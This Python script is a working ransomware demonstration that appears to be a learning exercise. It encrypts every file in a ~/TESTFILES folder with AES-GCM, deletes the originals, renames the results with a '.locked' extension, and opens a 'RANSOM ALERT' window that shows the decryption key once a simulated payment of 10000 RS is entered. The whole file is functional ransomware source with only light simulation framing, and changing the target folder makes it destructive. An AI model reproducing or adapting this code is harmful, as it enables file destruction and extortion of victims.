#!/usr/bin/env python3
import os
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import secrets
import tkinter as tk
from tkinter import messagebox

# -------------- CONFIG --------------
TARGET_FOLDER = str(Path.home() / "TESTFILES")   # default: ~/TESTFILES
KEY_FILENAME = "encryption_key.bin"
SKIP_FILES = {KEY_FILENAME, "encryption_key.key", Path(__file__).name, "decrypt_with_input_ubuntu.py"}
# -------------------------------------

target = Path(TARGET_FOLDER)
if not target.is_dir():
    raise SystemExit(f"Target folder not found: {TARGET_FOLDER}")

key_path = target / KEY_FILENAME

# create or load 32-byte key
if not key_path.exists():
    key = secrets.token_bytes(32)
    key_path.write_bytes(key)
    print("New 256-bit key generated and saved to:", key_path)
else:
    key = key_path.read_bytes()
    print("Using existing key:", key_path)

aesgcm = AESGCM(key)

# encrypt files (skip directories and skip key/script files)
encrypted = 0
for entry in list(target.iterdir()):
    if entry.is_dir():
        continue
    if entry.name in SKIP_FILES:
        continue
    if entry.name.endswith(".locked"):
        continue

    try:
        plaintext = entry.read_bytes()
        nonce = secrets.token_bytes(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=None)
        out_path = entry.with_name(entry.name + ".locked")
        out_path.write_bytes(nonce + ciphertext)
        entry.unlink()  # remove original
        encrypted += 1
        print(f"Encrypted: {entry.name} -> {out_path.name}")
    except Exception as e:
        print(f"Failed to encrypt {entry.name}: {e}")

print(f"Encryption complete ✅  Encrypted {encrypted} file(s).")

# ---------------- RANSOM POPUP UI ----------------
def show_ransom_popup():
    def on_submit():
        val = payment_input.get().strip()
        try:
            amt = int(val)
        except ValueError:
            messagebox.showerror("Error", "Enter a valid numeric amount (e.g., 10000).")
            return

        if amt == 10000:  # simulated payment
            # Show copyable key window
            hx = key.hex()
            top = tk.Toplevel(root)
            top.title("DECRYPTION KEY")
            top.geometry("640x160")

            lbl = tk.Label(top, text="Here is your decryption key (copy it):", font=("Arial", 11))
            lbl.pack(pady=8)

            key_text = tk.Text(top, height=2, width=80)
            key_text.insert(tk.END, hx)
            key_text.configure(state="disabled")  # read-only
            key_text.pack(padx=8, pady=4)

            def copy_to_clipboard():
                try:
                    # try tkinter clipboard first
                    top.clipboard_clear()
                    top.clipboard_append(hx)
                    messagebox.showinfo("Copied", "Key copied to clipboard.")
                except Exception:
                    # fallback: use xclip if available
                    try:
                        import subprocess
                        p = subprocess.Popen(['xclip','-selection','clipboard'], stdin=subprocess.PIPE)
                        p.communicate(input=hx.encode())
                        messagebox.showinfo("Copied", "Key copied to clipboard via xclip.")
                    except Exception as ee:
                        messagebox.showerror("Clipboard error", f"Failed to copy key: {ee}")

            copy_btn = tk.Button(top, text="Copy Key", command=copy_to_clipboard)
            copy_btn.pack(pady=6)
            return
        else:
            messagebox.showerror("Access denied", "Invalid payment (simulation).")

    root = tk.Tk()
    root.title("RANSOM ALERT")
    root.geometry("420x200")

    lbl = tk.Label(root, text="YOUR FILES ARE ENCRYPTED 🔒\nEnter payment (simulation) to receive key", font=("Arial", 12))
    lbl.pack(pady=10)

    pm_lbl = tk.Label(root, text="Payment amount (RS):")
    pm_lbl.pack()
    payment_input = tk.Entry(root, width=28)
    payment_input.pack(pady=6)

    submit = tk.Button(root, text="Submit", command=on_submit)
    submit.pack(pady=8)

    root.mainloop()

if __name__ == "__main__":
    show_ransom_popup()
